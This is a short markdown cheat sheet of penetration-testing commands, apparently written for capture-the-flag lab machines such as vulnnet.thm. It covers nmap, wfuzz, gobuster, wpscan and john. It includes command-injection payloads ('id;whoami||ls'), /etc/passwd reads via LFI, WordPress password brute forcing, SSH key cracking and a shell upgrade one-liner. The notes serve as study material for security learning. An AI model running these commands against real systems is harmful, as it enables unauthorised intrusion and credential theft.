# hacking_notes

## Recon

### Scanning ports
```powershell
sudo nmap -A -o scan_agsv.txt 10.10.10.218
sudo nmap -sS -p- -o scan_full.txt 10.10.10.218
```
### Fuzzing subdomains
```powershell
wfuzz -w subdomains-top1million-5000.txt -H "Host: FUZZ.vulnnet.thm" --hc 200 10.10.236.248
```

### LFI
```powershell
python ./panoptic.py --url http://vulnnet.thm/\?referer\=test
```

### Fuzzing for command executions via LFI 
```powershell
wfuzz -w SecLists-master/Discovery/Web-Content/burp-parameter-names.txt http://vulnnet.thm/\?\FUZZ\=id\;whoami\|\|ls
wfuzz --hh 5829 -w ~/Documents/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt http://vulnnet.thm/\?\FUZZ\=/etc/passwd
```

### Fuzzing dir
```powershell
gobuster -u http://broadcast.vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster -u http://10.10.236.248 -w SecLists-master/Discovery/Web-Content/common.txt
```

### Wordpress
```powershell
wpscan --url http://10.10.255.124/blog --enumerate u
wpscan --url http://10.10.74.136/ --passwords /usr/share/wordlists/rockyou.txt --usernames user1,user2
```


## Cracking

### Crack ssh passphrase
```powershell
python ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```


## Misc

### Start local server
```powershell
python -m SimpleHTTPServer
```

### Get tty in shell
```powershell
python3 -c'import pty;pty.spawn("/bin/bash")'
```

## TODO

[*] ftp
[*] hydra
[*] http bruteforce
[*] one line reverse shell
[*] linepeas
[*] check linux exploit
[*] smb (nmap script enum)
[*] john
[*] linepeas
